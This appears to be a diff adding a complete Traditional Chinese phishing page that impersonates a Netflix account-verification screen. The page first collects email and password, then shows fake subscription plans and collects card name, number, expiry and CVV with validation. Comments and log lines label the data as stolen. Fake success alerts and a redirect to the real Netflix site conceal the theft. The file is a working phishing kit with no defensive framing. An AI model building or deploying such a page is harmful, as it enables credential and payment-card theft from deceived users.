@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Netflix - 帳戶驗證</title>
+  <style>
+    /* CSS 樣式 */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+    }
+
+    body {
+      background-color: #000;
+      color: #fff;
+      min-height: 100vh;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    header {
+      padding: 20px 50px;
+    }
+
+    .logo {
+      color: #e50914;
+      font-size: 2.5rem;
+      font-weight: bold;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .form-box {
+      background-color: rgba(0, 0, 0, 0.75);
+      padding: 60px;
+      border-radius: 4px;
+      max-width: 500px;
+      width: 100%;
+      display: block;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      font-size: 1.5rem;
+      margin: 20px 0 10px;
+      color: #fff;
+    }
+
+    p {
+      margin-bottom: 30px;
+      color: #b3b3b3;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 4px;
+      background-color: #333;
+      color: #fff;
+      font-size: 1rem;
+    }
+
+    input.error {
+      border: 1px solid #e50914;
+    }
+
+    .error-message {
+      color: #e50914;
+      font-size: 0.8rem;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 15px;
+      background-color: #e50914;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 30px;
+    }
+
+    .btn:disabled {
+      background-color: #555;
+      cursor: not-allowed;
+    }
+
+    .help-links {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    a {
+      color: #b3b3b3;
+      text-decoration: none;
+    }
+
+    .plan-options {
+      margin: 20px 0;
+    }
+
+    .plan-option {
+      display: flex;
+      justify-content: space-between;
+      padding: 15px;
+      background-color: rgba(255, 255, 255, 0.1);
+      border-radius: 4px;
+      margin-bottom: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .plan-option:hover {
+      background-color: rgba(255, 255, 255, 0.2);
+    }
+
+    .plan-option.selected {
+      background-color: rgba(229, 9, 20, 0.2);
+      border: 1px solid #e50914;
+    }
+
+    .plan-details {
+      flex: 1;
+    }
+
+    .plan-name {
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    .plan-price {
+      color: #e50914;
+      font-weight: bold;
+    }
+
+    .plan-features {
+      font-size: 0.9rem;
+      color: #b3b3b3;
+    }
+
+    @media (max-width: 600px) {
+      .form-box {
+        padding: 30px;
+      }
+
+      header {
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <header>
+    <div class="logo">NETFLIX</div>
+  </header>
+
+  <main>
+    <!-- 第一階段：Netflix 登入表單 -->
+    <div id="loginFormBox" class="form-box">
+      <h1>請先登入您的帳戶</h1>
+      <p>為確保帳戶安全，請先驗證您的身份</p>
+
+      <form id="loginForm">
+        <div class="form-group">
+          <input type="email" id="email" placeholder="電子郵件或電話號碼" required>
+        </div>
+        <div class="form-group">
+          <input type="password" id="password" placeholder="密碼" required>
+        </div>
+        <button type="submit" class="btn">登入</button>
+      </form>
+
+      <div class="help-links">
+        <a href="#">需要幫助？</a>
+      </div>
+    </div>
+
+    <!-- 第二階段：金融資料表單 -->
+    <div id="paymentFormBox" class="form-box hidden">
+      <h1>更新付款資訊</h1>
+      <p>您的訂閱即將到期，請選擇方案並更新付款方式以繼續享受服務</p>
+
+      <h2>選擇您的方案</h2>
+      <div class="plan-options">
+        <div class="plan-option" data-plan="basic">
+          <div class="plan-details">
+            <div class="plan-name">基本方案</div>
+            <div class="plan-features">SD畫質 • 1個裝置</div>
+          </div>
+          <div class="plan-price">NT$290</div>
+        </div>
+
+        <div class="plan-option" data-plan="standard">
+          <div class="plan-details">
+            <div class="plan-name">標準方案</div>
+            <div class="plan-features">HD畫質 • 2個裝置</div>
+          </div>
+          <div class="plan-price">NT$380</div>
+        </div>
+
+        <div class="plan-option" data-plan="premium">
+          <div class="plan-details">
+            <div class="plan-name">高級方案</div>
+            <div class="plan-features">4K Ultra HD • 4個裝置</div>
+          </div>
+          <div class="plan-price">NT$460</div>
+        </div>
+      </div>
+
+      <h2>付款資訊</h2>
+      <form id="paymentForm">
+        <div class="form-group">
+          <input type="text" id="cardName" placeholder="卡片上的姓名" required>
+        </div>
+        <div class="form-group">
+          <input type="text" id="cardNumber" placeholder="信用卡號碼" required>
+          <div id="cardNumberError" class="error-message">信用卡號碼格式不正確</div>
+        </div>
+        <div class="form-group">
+          <input type="text" id="expiryDate" placeholder="到期日 (MM/YY)" required>
+          <div id="expiryDateError" class="error-message">請輸入有效的到期日 (MM/YY)</div>
+        </div>
+        <div class="form-group">
+          <input type="text" id="cvv" placeholder="安全碼 (CVV)" required>
+          <div id="cvvError" class="error-message">CVV 安全碼格式不正確</div>
+        </div>
+        <div class="form-group">
+          <select id="cardType" required>
+            <option value="">選擇卡片類型</option>
+            <option value="visa">Visa</option>
+            <option value="mastercard">Mastercard</option>
+            <option value="amex">American Express</option>
+          </select>
+        </div>
+        <button type="submit" id="submitBtn" class="btn">更新付款資訊</button>
+      </form>
+
+      <div class="help-links">
+        <a href="#">付款遇到問題？</a>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script>
+  // 信用卡驗證規則
+  const cardRules = {
+    visa: { pattern: /^4[0-9]{12}(?:[0-9]{3})?$/, cvvLength: 3 },
+    mastercard: { pattern: /^5[1-5][0-9]{14}$/, cvvLength: 3 },
+    amex: { pattern: /^3[47][0-9]{13}$/, cvvLength: 4 }
+  };
+
+  // DOM 元素
+  const cardNumberInput = document.getElementById('cardNumber');
+  const expiryDateInput = document.getElementById('expiryDate');
+  const cvvInput = document.getElementById('cvv');
+  const cardTypeSelect = document.getElementById('cardType');
+  const submitBtn = document.getElementById('submitBtn');
+  const planOptions = document.querySelectorAll('.plan-option');
+
+  // 錯誤訊息元素
+  const cardNumberError = document.getElementById('cardNumberError');
+  const expiryDateError = document.getElementById('expiryDateError');
+  const cvvError = document.getElementById('cvvError');
+
+  // 當前選擇的方案
+  let selectedPlan = null;
+
+  // 方案點擊事件
+  planOptions.forEach(option => {
+    option.addEventListener('click', function() {
+      planOptions.forEach(opt => opt.classList.remove('selected'));
+      this.classList.add('selected');
+      selectedPlan = this.getAttribute('data-plan');
+    });
+  });
+
+  // 驗證信用卡號碼
+  function validateCardNumber() {
+    const cardType = cardTypeSelect.value;
+    const cardNumber = cardNumberInput.value.replace(/\s/g, '');
+
+    if (!cardType) {
+      showError(cardNumberInput, cardNumberError, '請先選擇卡片類型');
+      return false;
+    }
+
+    if (!cardRules[cardType].pattern.test(cardNumber)) {
+      showError(cardNumberInput, cardNumberError, '信用卡號碼格式不正確');
+      return false;
+    }
+
+    hideError(cardNumberInput, cardNumberError);
+    return true;
+  }
+
+  // 驗證到期日
+  function validateExpiryDate() {
+    const expiryDate = expiryDateInput.value;
+    const regex = /^(0[1-9]|1[0-2])\/?([0-9]{2})$/;
+
+    if (!regex.test(expiryDate)) {
+      showError(expiryDateInput, expiryDateError, '請輸入有效的到期日 (MM/YY)');
+      return false;
+    }
+
+    hideError(expiryDateInput, expiryDateError);
+    return true;
+  }
+
+  // 驗證 CVV
+  function validateCVV() {
+    const cardType = cardTypeSelect.value;
+    const cvv = cvvInput.value;
+    const expectedLength = cardType ? cardRules[cardType].cvvLength : 3;
+
+    if (!cardType) {
+      showError(cvvInput, cvvError, '請先選擇卡片類型');
+      return false;
+    }
+
+    if (!/^\d+$/.test(cvv) || cvv.length !== expectedLength) {
+      showError(cvvInput, cvvError, `CVV 應為 ${expectedLength} 位數字`);
+      return false;
+    }
+
+    hideError(cvvInput, cvvError);
+    return true;
+  }
+
+  // 顯示錯誤
+  function showError(inputElement, errorElement, message) {
+    inputElement.classList.add('error');
+    errorElement.textContent = message;
+    errorElement.style.display = 'block';
+  }
+
+  // 隱藏錯誤
+  function hideError(inputElement, errorElement) {
+    inputElement.classList.remove('error');
+    errorElement.style.display = 'none';
+  }
+
+  // 驗證整個表單
+  function validateForm() {
+    const isCardValid = validateCardNumber();
+    const isExpiryValid = validateExpiryDate();
+    const isCVVValid = validateCVV();
+    const isPlanSelected = selectedPlan !== null;
+
+    submitBtn.disabled = !(isCardValid && isExpiryValid && isCVVValid && isPlanSelected);
+
+    return isCardValid && isExpiryValid && isCVVValid && isPlanSelected;
+  }
+
+  // 輸入事件監聽
+  cardNumberInput.addEventListener('input', function() {
+    // 自動添加空格增加可讀性
+    let value = this.value.replace(/\s/g, '');
+    if (value.length > 0) {
+      value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
+    }
+    this.value = value;
+    validateCardNumber();
+    validateForm();
+  });
+
+  expiryDateInput.addEventListener('input', function() {
+    // 自動添加斜線
+    let value = this.value.replace(/\D/g, '');
+    if (value.length >= 2) {
+      value = value.slice(0, 2) + '/' + value.slice(2, 4);
+    }
+    this.value = value;
+    validateExpiryDate();
+    validateForm();
+  });
+
+  cvvInput.addEventListener('input', function() {
+    // 限制只能輸入數字
+    this.value = this.value.replace(/\D/g, '');
+    validateCVV();
+    validateForm();
+  });
+
+  cardTypeSelect.addEventListener('change', function() {
+    validateCardNumber();
+    validateCVV();
+    validateForm();
+  });
+
+  // 處理登入表單提交
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    // 收集登入憑證
+    const credentials = {
+      email: document.getElementById('email').value,
+      password: document.getElementById('password').value,
+      timestamp: new Date().toISOString()
+    };
+
+    console.log('竊取的Netflix憑證:', credentials);
+
+    // 顯示假的"驗證成功"訊息
+    alert('驗證成功！請更新您的付款資訊以繼續服務。');
+
+    // 切換到付款表單
+    document.getElementById('loginFormBox').classList.add('hidden');
+    document.getElementById('paymentFormBox').classList.remove('hidden');
+  });
+
+  // 處理付款表單提交
+  document.getElementById('paymentForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    if (!validateForm()) return;
+
+    // 收集金融資料
+    const paymentInfo = {
+      plan: selectedPlan,
+      cardName: document.getElementById('cardName').value,
+      cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+      expiryDate: document.getElementById('expiryDate').value,
+      cvv: document.getElementById('cvv').value,
+      cardType: document.getElementById('cardType').value,
+      timestamp: new Date().toISOString()
+    };
+
+    console.log('竊取的金融資料:', paymentInfo);
+
+    // 顯示假的重導頁面
+    alert('付款資訊已更新！您將被重新導向至Netflix首頁。');
+    window.location.href = 'https://www.netflix.com';
+  });
+
+  // 初始禁用提交按鈕
+  submitBtn.disabled = true;
+</script>
+</body>
+</html>
